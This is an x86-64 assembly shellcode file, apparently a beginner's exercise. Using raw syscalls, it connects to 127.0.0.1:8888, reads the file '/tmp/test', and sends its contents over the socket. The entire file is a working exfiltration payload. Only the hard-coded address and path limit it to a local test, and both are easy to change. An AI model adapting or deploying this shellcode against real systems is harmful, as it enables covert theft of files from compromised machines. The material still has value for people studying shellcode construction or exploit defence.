.global _start
_start:
.intel_syntax noprefix

# socket
xor rax, rax
xor rdi, rdi
xor rsi, rsi
mov dil, 2              # AF_INET
mov sil, 1              # SOCKET_STREAM
xor rdx, rdx            # protocol
mov al, 41              # socket()
syscall

# connect (this might be super sloppy, first time always is :P)
xor rdi, rdi
mov rdi, rax            # sockfd
xor rax, rax
push rax
mov rax, 0x0100007f     # 127.0.0.1
shl rax, 16
mov ah, 0xb8            # 8888
mov al, 0x22
shl rax, 16
mov al, 2               # AF_INET 
push rax
mov rsi, rsp
pop rax
mov rdx, 16             # length of address:port
xor rax, rax
mov al, 42              # connect()
syscall

# open
mov rdx, rdi            # sockfd
lea rbx, [rip+filename] # load filename
mov rdi, rbx            # fn argument
xor rsi, rsi            # 0
mov al, 2               # open()
syscall

# read
mov rbx, rdx            #sockfd
mov rdi, rax            # fd from open
xor rax, rax
lea rsi, [rsp-2048]     # char *buf
mov rdx, 1000           # count
mov al, 0               # read()
syscall

# sendto
mov rdi, rbx            # sockfd
lea rsi, [rsp-2048]     # char *buf
mov rdx, 1000           # count
xor r10, r10            # 0
xor r9, r9              # NULL
xor r8, r8              # 0
xor rax, rax
mov al, 44              # sendto()
syscall

# exit
xor rax, rax
mov al, 60              # exit()
syscall

filename:
.string "/tmp/test"
